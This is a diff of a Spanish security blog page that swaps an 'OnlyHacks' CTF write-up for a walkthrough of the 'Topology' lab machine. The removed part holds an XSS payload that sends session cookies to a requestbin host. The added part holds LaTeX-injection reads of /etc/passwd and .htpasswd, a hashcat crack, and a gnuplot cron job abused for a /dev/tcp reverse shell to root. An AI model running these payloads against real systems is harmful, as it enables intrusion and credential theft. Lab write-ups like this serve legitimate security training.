@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>OnlyHacks &middot; Loaxert</title>
-  <meta name="title" content="OnlyHacks &middot; Loaxert" />
+  <title>Topology &middot; Loaxert</title>
+  <meta name="title" content="Topology &middot; Loaxert" />
   
   
-  <meta name="keywords" content="Web, Insecure Direct Object Reference (IDOR), XSS, " />
+  <meta name="keywords" content="crontabs, linux, latex, sudo, subdominio, file-read, apache2, pspy64, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/challenges/onlyhacks/onlyhacks/" />
+  <link rel="canonical" href="http://localhost:1313/maquinas/prueba/topology/" />
   
   
   
@@ -70,50 +70,53 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/challenges/onlyhacks/onlyhacks/">
+  <meta property="og:url" content="http://localhost:1313/maquinas/prueba/topology/">
   <meta property="og:site_name" content="Loaxert">
-  <meta property="og:title" content="OnlyHacks">
-  <meta property="og:description" content="Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.">
+  <meta property="og:title" content="Topology">
+  <meta property="og:description" content="Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root Dificultad: Facil">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
-    <meta property="article:section" content="challenges">
-    <meta property="article:published_time" content="2025-02-20T17:00:00-05:00">
-    <meta property="article:modified_time" content="2025-02-20T17:00:00-05:00">
-    <meta property="article:tag" content="Web">
-    <meta property="article:tag" content="Insecure Direct Object Reference (IDOR)">
-    <meta property="article:tag" content="XSS">
+    <meta property="article:section" content="maquinas">
+    <meta property="article:published_time" content="2025-02-21T17:00:00-05:00">
+    <meta property="article:modified_time" content="2025-02-21T17:00:00-05:00">
+    <meta property="article:tag" content="Crontabs">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Latex">
+    <meta property="article:tag" content="Sudo">
+    <meta property="article:tag" content="Subdominio">
+    <meta property="article:tag" content="File-Read">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="OnlyHacks">
-  <meta name="twitter:description" content="Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.">
+  <meta name="twitter:title" content="Topology">
+  <meta name="twitter:description" content="Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root Dificultad: Facil">
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Challenges",
-    "name": "OnlyHacks",
-    "headline": "OnlyHacks",
+    "articleSection": "Maquinas",
+    "name": "Topology",
+    "headline": "Topology",
     
-    "abstract": "Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.",
+    "abstract": "Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root Dificultad: Facil",
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/challenges\/onlyhacks\/onlyhacks\/",
+    "url" : "http:\/\/localhost:1313\/maquinas\/prueba\/topology\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-02-20T17:00:00-05:00",
-    "datePublished": "2025-02-20T17:00:00-05:00",
+    "dateCreated": "2025-02-21T17:00:00-05:00",
+    "datePublished": "2025-02-21T17:00:00-05:00",
     
-    "dateModified": "2025-02-20T17:00:00-05:00",
+    "dateModified": "2025-02-21T17:00:00-05:00",
     
-    "keywords": ["Web","Insecure Direct Object Reference (IDOR)","XSS"],
+    "keywords": ["crontabs","linux","latex","sudo","subdominio","file-read","apache2","pspy64"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "266"
+    "wordCount": "759"
   }]
   </script>
 
@@ -476,7 +479,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      OnlyHacks
+      Topology
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -517,7 +520,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-20T17:00:00-05:00">20 febrero 2025</time>
+  <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
   
 
   
@@ -642,31 +645,147 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <p>Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.</p>
-<p><a href="https://imgur.com/XA5fCKn"><img src="https://i.imgur.com/XA5fCKn.png" title="source: imgur.com" /></a></p>
-<p>Dentro podremos ver una web de citas en la que la unica persona interesante es Renata ya que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.</p>
-<p><a href="https://imgur.com/SPZKCYs"><img src="https://i.imgur.com/SPZKCYs.png" title="source: imgur.com" /></a></p>
-<p>En este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting yla otra es modifcando la url ya que podemos ver que cada chat tiene un id.</p>
-<p>Vamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hi<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p><a href="https://imgur.com/xZtJ9UZ"><img src="https://i.imgur.com/xZtJ9UZ.png" title="source: imgur.com" /></a></p>
-<p>Vamos a tratar de consegir la cookie de su sesion con el siguiente comando:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://requestbin.whapi.cloud/19bdo3d1?
-</span></span></span><span class="line"><span class="cl"><span class="s1">c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>Vamos a ir a esta pagina <a href="http://requestbin.whapi.cloud/" target="_blank">http://requestbin.whapi.cloud/</a> crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:</p>
-<p><a href="https://imgur.com/KL2LC4b"><img src="https://i.imgur.com/KL2LC4b.png" title="source: imgur.com" /></a></p>
-<p>Remplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.</p>
-<p><a href="https://imgur.com/gF6SYzC"><img src="https://i.imgur.com/gF6SYzC.png" title="source: imgur.com" /></a></p>
-<p>Ahora vamos con la segunda forma</p>
-<p>Cuando entramos al chat de renata podemos ver como la url es:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">http://94.237.55.96:37246/chat/?rid=6
-</span></span></code></pre></div><p>Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Creamos el diccionario</span>
-</span></span><span class="line"><span class="cl">sed <span class="m">1</span> <span class="m">100</span> &gt; id.txt
+          <p>Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root
+Dificultad: Facil</p>
+
+
+<h1 class="relative group">Enumeración 
+    <div id="enumeraci%C3%B3n" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeraci%C3%B3n" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn IP -oG allPorts
+</span></span></code></pre></div><ul>
+<li><code>-p-</code> Escanea todos los puertos <code>1-65535</code> .</li>
+<li><code>—open</code> Solo muestra los puertos que esten abiertos.</li>
+<li><code>-sS</code> Stealt scan cambia el modo de escane haciendo que no se complete el hanshake.</li>
+<li><code>—min-rate 5000</code> Como minimo va a enviar 5000 paquetes por segundo.</li>
+<li><code>-vvv</code> Aumenta la verbosidad mostrando la maxima informacion posible mientras se ejecuta.</li>
+<li><code>-n</code> Desactiva la resolucion <code>DNS</code> no va a tratar de resolver los nombres de dominio.</li>
+<li><code>-Pn</code> Nmap por default manda un ping a la ip esto lo desactiva.</li>
+<li><code>-oG allPorts</code> Guarda el escaneo en formato <code>oG</code> en el archivo llamado <code>allPorts</code>.</li>
+</ul>
+<p>Este escaneo nos dio dos puertos el 22 y el 80 vamos a hacer un escaneo mas exhaustivo a estos puertos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sCV -p22,80 IP -A -oN target
+</span></span></code></pre></div><ul>
+<li><code>-sCV</code> Esto ejecuta una serie de scripts predeterminados de nmap para obtener información adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la version exacta.</li>
+<li><code>-p22, 80</code> Especifica que puertos se van a escanear.</li>
+<li><code>-A</code> Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute.</li>
+</ul>
+<p><a href="https://imgur.com/u8zXpKh"><img src="https://i.imgur.com/u8zXpKh.png" title="source: imgur.com" /></a></p>
+<p>La pagina http que esta en el puerto 80 usa Apache 2.4.41</p>
+
+
+<h2 class="relative group">Puerto 80 
+    <div id="puerto-80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#puerto-80" aria-label="Ancla">#</a>
+    </span>        
+    
+</h2>
+<p><a href="https://imgur.com/P2kGwLQ"><img src="https://i.imgur.com/P2kGwLQ.png" title="source: imgur.com" /></a></p>
+<p>Al momento de entrar a el link <code>“Latex Equation Generator”</code> es un subdmonio por lo que tendremos que agregarlo al <code>/etc/hosts</code> para que nos muestre lo siguiente.</p>
+<p><a href="https://imgur.com/T7QA4dq"><img src="https://i.imgur.com/T7QA4dq.png" title="source: imgur.com" /></a></p>
+<p>Algo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente url <a href="http://latex.topology.htb/equation.php" target="_blank"><code>http://latex.topology.htb/</code></a> dejando el ultimo <code>/</code> .</p>
+<p><a href="https://imgur.com/aTp681K"><img src="https://i.imgur.com/aTp681K.png" title="source: imgur.com" /></a></p>
+<p>Revisando los archivos lo unico util esta en <code>equationtest.tex</code> ya que nos muestra como estan tratando la entrada Latex la web.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="k">\documentclass</span><span class="nb">{</span>standalone<span class="nb">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">\input</span><span class="nb">{</span>header<span class="nb">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">\begin</span><span class="nb">{</span>document<span class="nb">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ffuf -w id.txt -u <span class="s1">&#39;http://94.237.55.96:37246/chat/?rid=FUZZ&#39;</span> -H <span class="s2">&#34;Cookie: session=TUCOOKIE&#34;</span> -mc <span class="m">200</span>
-</span></span></code></pre></div><p>Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos la flag.</p>
-<p><a href="https://imgur.com/EA0H2hP"><img src="https://i.imgur.com/EA0H2hP.png" title="source: imgur.com" /></a></p>
+</span></span><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\int</span><span class="nb">_{a}^b</span><span class="nv">\int</span><span class="nb">_{c}^d f</span><span class="o">(</span><span class="nb">x,y</span><span class="o">)</span><span class="nb">dxdy </span><span class="s">$</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">\end</span><span class="nb">{</span>document<span class="nb">}</span>
+</span></span></code></pre></div><p>Podemos observar que la entrada esta entre los signos dolar, leyendo la pagina nos dicen que latex esta en el modo “<a href="https://www.physicsread.com/latex-math-mode/" target="_blank">inline math</a>” buscando acerca de este modo nos encontramos que hay tres formas de tratar este modo:</p>
+<ol>
+<li>$ . . .$</li>
+<li>\begin{math} . . . \end{math}</li>
+<li>( . . . )</li>
+</ol>
+
+
+<h1 class="relative group">Foothold 
+    <div id="foothold" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#foothold" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<p>Por lo que ahora sabemos porque esta entre esos signos y confirmamos que la entrada va a estar así planeando una inyección.</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank">PayloadsAllTheThings</a></p>
+<p>Vamos a tratar de empezar a leer archivos del sistema con la inyección de codigo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">passwd} </span><span class="s">$</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/eFdUTzY"><img src="https://i.imgur.com/eFdUTzY.png" title="source: imgur.com" /></a></p>
+<p>Una vez confirmamos que podemso leer archivos vamos a empezar a leer archivos de configuracion que nos permitan ingresar al sistema.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">apache</span><span class="m">2</span><span class="o">/</span><span class="nb">sites</span><span class="o">-</span><span class="nb">enabled</span><span class="o">/</span><span class="m">000</span><span class="o">-</span><span class="nb">default.conf} </span><span class="s">$</span>
+</span></span></code></pre></div><p>En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio <code>dev.topology.htb</code> lo agregamos al <code>/etc/hosts</code> y al ingresar nos pide una contraseña.</p>
+<p>Vamos a listar archivos de configuracion por default de apache sobre el directorio correspondiente a este subdominio.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">var</span><span class="o">/</span><span class="nb">www</span><span class="o">/</span><span class="nb">dev</span><span class="o">/</span><span class="nb">.htaccess} </span><span class="s">$</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/pH0zQXZ"><img src="https://i.imgur.com/pH0zQXZ.png" title="source: imgur.com" /></a></p>
+<p>Por ultimo vamos a listar este archivo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nb"> </span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">var</span><span class="o">/</span><span class="nb">www</span><span class="o">/</span><span class="nb">dev</span><span class="o">/</span><span class="nb">.htpasswd} </span><span class="s">$</span>
+</span></span></code></pre></div><p>Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo <code>.txt</code> para hacerle fuerza bruta con <code>hashcat</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="nb">hash</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">wordlist</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">user</span>
+</span></span></code></pre></div><p>Esto nos dara su contraseña para iniciar sesion mediante ssh.</p>
+
+
+<h1 class="relative group">Root 
+    <div id="root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">Enumeración 
+    <div id="enumeraci%C3%B3n-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeraci%C3%B3n-1" aria-label="Ancla">#</a>
+    </span>        
+    
+</h2>
+<p>Primero vamos a hacer el tratamiento de la shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><p>Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extraño por lo que lo unico que tiene algo interesante son las crontab pero no nos permite listarlas por lo que vamos a usar la herramienta <a href="https://github.com/DominicBreuker/pspy/tree/master" target="_blank">Pspy</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Maquina atacante </span>
+</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Maquina victima</span>
+</span></span><span class="line"><span class="cl">wget IP/pspy64
+</span></span><span class="line"><span class="cl">chmod +x pspy64 
+</span></span><span class="line"><span class="cl">./pspy64
+</span></span></code></pre></div><p>Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto <code>/opt/gnuplot/getdata.sh</code> .</p>
+<p><a href="https://imgur.com/9ry28PV"><img src="https://i.imgur.com/9ry28PV.png" title="source: imgur.com" /></a></p>
+<p>Si analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio <code>/opt/gnuplot/</code> todos los archivos con extension <code>plt</code> y los ejecuta.</p>
+<p>Si tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con <code>gnuplot</code> que es el binario que se ejecuta encontramos la siguiente <a href="https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/gnuplot-privilege-escalation" target="_blank">Exploit</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Maquina atacante</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Maquina victima</span>
+</span></span><span class="line"><span class="cl">nano rev.plt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">system <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mv rev.plt /opt/gnuplot/
+</span></span></code></pre></div><p>Con esto tendremos acceso como root y habremos completado la maquina.</p>
 
           
           
@@ -689,8 +808,8 @@
           
         
       <script>
-        var oid = "views_Challenges\/OnlyHacks\/OnlyHacks.md"
-        var oid_likes = "likes_Challenges\/OnlyHacks\/OnlyHacks.md"
+        var oid = "views_Maquinas\/prueba\/topology.md"
+        var oid_likes = "likes_Maquinas\/prueba\/topology.md"
       </script>
       
       
@@ -701,6 +820,43 @@
   <footer class="pt-8 max-w-prose print:hidden">
 
     
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/maquinas/topology/topology/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Topology</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-02-21T17:00:00-05:00">21 febrero 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
   
 
 
